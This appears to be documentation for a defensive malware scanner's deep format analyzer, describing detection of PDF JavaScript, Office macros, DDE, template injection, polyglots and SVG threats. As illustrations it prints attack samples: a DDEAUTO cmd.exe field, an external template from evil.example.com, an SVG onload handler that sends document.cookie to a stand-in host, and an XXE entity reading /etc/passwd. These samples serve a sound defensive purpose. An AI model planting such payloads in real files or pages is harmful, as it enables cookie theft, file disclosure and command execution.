# Deep Format Analysis Guide

The deep format analyzer (`core/deep_format_analyzer.py`) performs native parsing of PDF, Office, SVG, and polyglot files to detect threats that metadata-level analysis alone cannot catch. It identifies JavaScript injection, malicious macros, template attacks, polyglot constructs, and SVG-based threats.

## Supported Analyzers

| Analyzer | File Types | Key Detections |
|---|---|---|
| `PDFAnalyzer` | `.pdf` | JavaScript, OpenAction, embedded files, SubmitForm |
| `OfficeAnalyzer` | `.docx`, `.xlsx`, `.pptx`, `.doc`, `.xls` | Macros, OLE objects, DDE, external templates |
| `PolyglotDetector` | All | Files valid in multiple formats simultaneously |
| `SVGAnalyzer` | `.svg` | Script tags, XXE, event handlers, data URIs, foreignObject |

---

## PDF Threat Detection

### JavaScript in PDFs

PDFs can contain JavaScript in multiple locations. HADES checks:

- `/JS` and `/JavaScript` actions in the catalog
- `/Names` dictionary JavaScript name tree
- `/OpenAction` entries that execute JavaScript on open
- `/AA` (Additional Actions) dictionary

```
[DEEP]  PDF contains JavaScript in /Names dictionary (severity: 8)
        ATT&CK: T1059.007 JavaScript (Execution)
```

### OpenAction

PDF `/OpenAction` entries execute automatically when the document is opened. HADES flags:

- JavaScript execution on open
- URI actions (automatic URL navigation)
- Launch actions (execute external programs)

### Embedded Files

PDFs can contain embedded file streams. HADES detects:

- Embedded executables (`.exe`, `.dll`, `.bat`, `.ps1`)
- Embedded archives (`.zip`, `.rar`)
- Any `/EmbeddedFiles` name tree entries

### SubmitForm Actions

`/SubmitForm` actions send form data to external URLs, potentially exfiltrating document content:

```
[DEEP]  PDF SubmitForm action detected: URL target found (severity: 7)
```

---

## Office Document Threats

### Macro Detection

HADES detects VBA macros in both modern (`.docx`/`.xlsx`/`.pptx`) and legacy (`.doc`/`.xls`) Office formats:

- `vbaProject.bin` in ZIP-based Office documents
- OLE streams containing macro code in legacy formats
- Auto-execute macros (`AutoOpen`, `Auto_Open`, `Document_Open`, `Workbook_Open`)

### External Template Injection

Office documents can reference external templates that load on open:

```xml
<Relationship Type="...attachedTemplate"
  Target="https://evil.example.com/template.dotm"
  TargetMode="External"/>
```

HADES parses `word/_rels/document.xml.rels` and flags external template references.

### DDE (Dynamic Data Exchange)

DDE fields in Word documents can execute commands:

```
{DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"}
```

HADES scans `word/document.xml` for DDE and DDEAUTO field codes.

### OLE Object Detection

Legacy Office documents may contain embedded OLE objects. When `olefile` is installed, HADES inspects OLE streams for:

- Executable content
- Suspicious stream names
- Embedded objects within objects

---

## Polyglot File Detection

A polyglot file is valid in multiple formats simultaneously. Attackers use polyglots to bypass upload filters and content type checks.

HADES detects these polyglot combinations:

| Combination | Detection Method |
|---|---|
| JPEG + ZIP | JPEG header (FFD8FF) followed by ZIP structures (PK header) |
| JPEG + RAR | JPEG header followed by RAR signature |
| PDF + JavaScript | PDF header with embedded JavaScript outside normal PDF structure |
| PNG + HTML | PNG header with HTML content in trailing data |
| GIF + JavaScript | GIF header with script content in comment blocks |
| Generic dual-header | Two different format signatures in the same file |

```
[DEEP]  Polyglot detected: File is valid as both JPEG and ZIP (severity: 7)
        ATT&CK: T1036.008 Masquerading: File Type (Defense Evasion)
```

---

## SVG Threat Detection

SVG files are XML-based and can contain active content:

### Script Tags

```xml
<svg><script>alert(document.cookie)</script></svg>
```

### Event Handlers

```xml
<svg onload="fetch('https://evil.example.com/steal?data='+document.cookie)">
```

### XXE (XML External Entity)

```xml
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg>&xxe;</svg>
```

### foreignObject

```xml
<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml">
  <script>malicious_code()</script>
</body></foreignObject></svg>
```

### Data URIs

```xml
<image href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="/>
```

---

## Pipeline Integration

The deep format analyzer runs as an additional pass in the `EnhancedDetectionEngine.analyze()` pipeline:

```
File → Metadata Extraction → YARA → Heuristic → IOC → ML → Deep Format → Result
```

The engine checks `DEEP_FORMAT_AVAILABLE` before calling the analyzer. Missing optional dependencies (`pikepdf`, `olefile`) cause graceful degradation -- the analyzer falls back to regex-based parsing for PDF and skips OLE-specific checks for Office.

---

## Optional Dependencies

| Package | Purpose | Fallback |
|---|---|---|
| `pikepdf` | Native PDF parsing, object tree traversal | Regex-based pattern matching |
| `olefile` | OLE compound file parsing (legacy Office) | OLE-specific checks skipped |

All format-parsing dependencies are bundled inside the Nuitka-compiled HADES binary (Path A direct download or Path B Homebrew tap, see `docs/installation.md`). You do NOT need to install `pikepdf`, `olefile`, or any other library separately; the binary ships with its Python interpreter and dependency tree included. The mentions above are for understanding which library handles each format internally, not as install instructions.

---

## Example Detections

### Malicious PDF with JavaScript

```bash
$ hades-enhanced malicious.pdf -v

File: malicious.pdf
  [DEEP]  PDF contains JavaScript in /OpenAction (severity: 8)
  [DEEP]  PDF OpenAction executes on document open (severity: 7)
  [YARA]  HADES_METADATA_BASE64_PAYLOAD (severity: 7)

  Threat Score: 78/100 (CRITICAL)
```

### Office Document with Template Injection

```bash
$ hades-enhanced phishing.docx -v

File: phishing.docx
  [DEEP]  External template reference detected (severity: 8)
          Target: https://evil.example.com/template.dotm
  [MITRE] T1221 Template Injection (Execution)

  Threat Score: 72/100 (HIGH)
```

### JPEG+ZIP Polyglot

```bash
$ hades-enhanced image.jpg -v

File: image.jpg
  [DEEP]  Polyglot: valid as JPEG and ZIP (severity: 7)
  [YARA]  HADES_POLYGLOT_JPEG_ZIP (severity: 7)
  [MITRE] T1036.008 Masquerading: File Type (Defense Evasion)

  Threat Score: 65/100 (HIGH)
```

---

## Next Steps

- [YARA Rules Guide](yara_rules_guide.md) -- Pattern-based detection
- [Interpreting Results](interpreting_results.md) -- Understanding deep format findings
- [Detection Depth Guide](detection_depth_guide.md) -- Full detection architecture
